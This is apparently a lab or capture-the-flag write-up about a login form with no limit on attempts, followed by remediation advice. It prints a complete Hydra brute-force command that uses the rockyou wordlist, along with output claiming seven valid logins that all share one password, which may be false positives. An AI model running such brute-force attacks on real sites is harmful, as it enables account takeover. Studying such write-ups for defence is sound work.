## 📌 Breach Name: **HTTP-BruteForceAllCreds**

---

## 📌 Vulnerability Type:
- **CWE-307: Improper Restriction of Excessive Authentication Attempts**
- **CWE-308: Use of Single-Factor Authentication**
- **CWE-521: Weak Password Requirements**

![alt text](https://cwe.mitre.org/data/images/CWE-307-Diagram.png)

--- 
## 📖 Exploitation Steps:
1. **Prepared rockyou.txt containing common words.**

2. **Run Hydra:**
   ```bash
   hydra \
   -L /media/atabiti/atabiti_ssd/rockyou.txt \
   -P /media/atabiti/atabiti_ssd/rockyou.txt \
   10.11.100.193 http-get-form \
   "/:page=signin&username=^USER^&password=^PASS^&Login=Login:Wrong"

### Hydra returned multiple valid credentials:


    [80][http-get-form] host: 10.11.100.193   login: monkey   password: shadow
    [80][http-get-form] host: 10.11.100.193   login: 123456   password: shadow
    [80][http-get-form] host: 10.11.100.193   login: 12345   password: shadow
    [80][http-get-form] host: 10.11.100.193   login: 123456789   password: shadow
    [80][http-get-form] host: 10.11.100.193   login: password   password: shadow
    [80][http-get-form] host: 10.11.100.193   login: iloveyou   password: shadow
    [80][http-get-form] host: 10.11.100.193   login: princess   password: shadow

---

### 🔴 Critical Security Impacts:

Key impacts include:

- Complete compromise of multiple user accounts across the system
- Access to sensitive user data and functionality through authenticated sessions
---
## 📌 Security Recommendations:

1. **Implement Rate Limiting and Account Lockout:**
   - Restrict the number of login attempts per IP and per account
   - Temporarily lock accounts after a specified number of failed attempts
   - Implement exponential backoff for repeated login failures

2. **Add Multi-layered Authentication Controls:**
   - Implement CAPTCHA or reCAPTCHA after initial failed attempts
   - Consider multi-factor authentication for sensitive accounts
   - Use device fingerprinting to detect suspicious login patterns

3. **Strong Monitoring and Alerting:**
   - Monitor and alert on multiple failed login attempts from the same IP
   - Track login attempts across distributed systems to prevent bypass
   - Implement real-time anomaly detection for authentication events

4. **Improve Password Policies:**
   - Enforce strong, unique passwords per account
   - Implement password complexity requirements
   - Check passwords against known breached password databases

5. **Additional Security Measures:**
   - Use secure cookies and proper session management
   - Consider IP-based restrictions for administrative accounts
   - Implement proper logging for security events and auditing


